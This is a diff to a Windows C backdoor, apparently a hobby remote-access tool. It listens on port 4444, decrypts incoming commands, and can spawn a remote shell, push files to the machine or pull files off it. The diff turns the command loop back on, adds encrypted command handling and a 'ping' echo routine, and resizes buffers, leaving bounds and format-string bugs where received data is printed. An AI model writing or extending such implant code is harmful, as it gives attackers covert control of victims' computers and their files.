@@ -6,7 +6,7 @@
 #include<io.h>
 #include "helper.h"
 #include "encryption.h"
-#define DEFAULT_BUFLEN 2048
+#define DEFAULT_BUFLEN 128
 
 #pragma comment(lib, "ws2_32.lib") //for dynamically linked library
 #pragma warning(disable:4996) 
@@ -14,45 +14,86 @@ void CreateShell(int port);
 int startup();
 void recieve();
 void upload();
+void ping();
 int port = 4444;
 SOCKET sockt; //global sockt
 int main() {
-	trail();
-	/*
+	//trail();
+	
 	while (TRUE) {
 		//search for connection every 5 seconds
 		Sleep(5000);
 		int con = startup();
 		// waiting for a connection checks every 5 seconds
 		if (con == 1) {
-			char RecvData[DEFAULT_BUFLEN];
+			unsigned char RecvData[DEFAULT_BUFLEN];
+			printf("start of while");
 			while (TRUE) {
 				memset(RecvData, 0, sizeof(RecvData));
-				int RecvCode = recv(sockt, RecvData, DEFAULT_BUFLEN, 0);
-
-				if (strcmp(RecvData, "conend\n") == 0) {//if user sends exit then program resets
+				int RecvCode = recv(sockt, RecvData, 16, 0);
+				printf("recved data");
+				printf("Ciphertext is:\n");
+				BIO_dump_fp(stdout, (const char*)RecvData, RecvCode);
+				unsigned char plaintext[DEFAULT_BUFLEN];
+				int length = decrypt(RecvData, RecvCode, plaintext);
+				plaintext[length] = '\0';
+				printf(plaintext);
+				if (strcmp(plaintext, "conend\n") == 0) {//if user sends exit then program resets
 					closesocket(sockt);
 					WSACleanup();
 					exit(0);
 				}
-				else if (strcmp(RecvData, "shell\n") == 0) {// starts shell process if user types shell
+				else if (strcmp(plaintext, "shell\n") == 0) {// starts shell process if user types shell
 					//start shell process
 					CreateShell(port);
 				}
-				else if (strcmp(RecvData, "send\n") == 0) {// starts send process
+				else if (strcmp(plaintext, "send\n") == 0) {// starts send process
 					recieve();
 				}
-				else if (strcmp(RecvData, "download\n") == 0) {
+				else if (strcmp(plaintext, "download\n") == 0) {
 					upload();
 				}
-
+				else if (strcmp(plaintext, "ping\n") == 0) {
+					ping();
+				}
 			}
 		}
 	
 	}
-	*/
+	
 	return 0;
 }  
+void ping() { //simply for testing 
+	printf("entered ping");
+	while (TRUE) {
+		//setup decrypt var
+		unsigned char plaintext[DEFAULT_BUFLEN];
+		unsigned char RecvData[DEFAULT_BUFLEN];
+		memset(RecvData, 0, sizeof(RecvData));
+
+		//recieve data from sockt put length of data in RecvCode
+		int RecvCode = recv(sockt, RecvData, DEFAULT_BUFLEN, 0);
+
+		//decrypt and store length decrypted in val
+		int val = decrypt(RecvData, RecvCode, plaintext);
+		printf("past decrypt\n");
+		//add EOF so that string in printable
+		plaintext[val] = '\0';
+		printf(plaintext);
+
+
+		//setup encrypt var
+		unsigned char encryped[DEFAULT_BUFLEN];
+		memset(encryped, 0, sizeof(encryped));
+
+		//encrypt plaintext into encrypted buffer
+		encrypt(plaintext, val, encryped);
+		printf("\npast encrypt");
+		//send encrypted back over socket
+		send(sockt, encryped, DEFAULT_BUFLEN, 0);
+		printf("sent item");
+	}
+}
 void CreateShell(int port) {
 		STARTUPINFO ini_processo;
 		PROCESS_INFORMATION processo_info;
@@ -139,7 +180,7 @@ void recieve() {
 			free(tmpbuff);
 			break;
 		}
-		int bytesrecv = recv(sockt, buffer, 2048, MSG_WAITALL);
+		int bytesrecv = recv(sockt, buffer, DEFAULT_BUFLEN, MSG_WAITALL);
 		fwrite(buffer, bytesrecv, 1, ptr);
 		recvbytes += bytesrecv;
 	}
@@ -156,11 +197,11 @@ void upload() {
 	char buffer[DEFAULT_BUFLEN] = { '\0' }; //create buffer for recieving
 
 	if (size != -1) {
-		char sizechar[10] = { '\0' };
+		char sizechar[16] = { '\0' };
 		sprintf(sizechar, "%d", size);
 		send(sockt, sizechar, sizeof(sizechar), 0); //send file size
 
-		int rec = recv(sockt, buffer, 2048, 0); //expecting one byte confirm
+		int rec = recv(sockt, buffer, DEFAULT_BUFLEN, 0); //expecting one byte confirm
 
 		if (rec == 1) {
 			FILE* fp = fopen(file_path, "rb"); //read in bytes
